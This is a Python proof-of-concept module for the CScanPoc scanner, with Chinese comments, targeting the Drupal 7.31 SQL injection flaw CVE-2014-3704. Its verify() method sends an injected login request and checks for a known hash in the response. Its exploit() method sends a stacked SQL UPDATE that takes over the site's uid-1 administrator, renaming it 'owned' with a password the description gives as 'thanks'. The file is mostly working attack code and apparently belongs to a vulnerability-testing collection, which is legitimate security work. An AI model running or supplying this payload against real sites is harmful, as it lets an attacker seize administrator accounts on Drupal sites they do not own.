# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Drupal_0005'  # 平台漏洞编号，留空
    name = 'Drupal 7.31 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-10-16'  # 漏洞公布时间
    desc = '''
        Drupal在处理IN语句的时候，要通过expandArguments函数来展开数组。由于expandArguments函数没有对当前数组中key值进行有效的过滤，给攻击者可乘之机。攻击者通过精心构造的SQL语句可以执行任意PHP代码。
        把原来id为1的管理，替换成名字为owned，密码是thanks的管理员。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/2310/'    # 漏洞来源
    cnvd_id = 'Unknown'    # cnvd漏洞编号
    cve_id = 'CVE-2014-3704'    # cve编号
    product = 'Drupal'  # 漏洞应用名称
    product_version = '7.31'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '04659590-2646-4387-bc0e-9a0730a578dd'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-21'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/?q=node&destination=node'
            cookies = {'Drupal.toolbar.collapsed': '0',
                       'Drupal.tableDrag.showWeight': '0', 'has_js': '1'}
            data = "name[0%20;select%20'<?php%20print(md5(c))?>'+where+uid+%3d+'1';;#%20%20]=test3&name[0]=test&pass=shit2&test2=test&form_build_id=&form_id=user_login_block&op=Log+in"
            url = self.target + payload
            r = requests.post(url, cookies=cookies, data=data)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # http://bobao.360.cn/news/detail/579.html
            payload = '/?q=node&destination=node'
            cookies = {'Drupal.toolbar.collapsed': '0',
                       'Drupal.tableDrag.showWeight': '0', 'has_js': '1'}
            data = "name[0%20;update+users+set+name%3d'owned'+,+pass+%3d+'$S$DkIkdKLIvRK0iVHm99X7B/M8QC17E1Tp/kMOd1Ie8V/PgWjtAZld'+where+uid+%3d+'1';;#%20%20]=test3&name[0]=test&pass=shit2&test2=test&form_build_id=&form_id=user_login_block&op=Log+in"
            url = self.target + payload
            r = requests.post(url, cookies=cookies, data=data)

            if 'localhost' in r.text and 'Error message' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，已把原来id为1的管理，替换成名字为owned，密码是thanks的管理员。'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
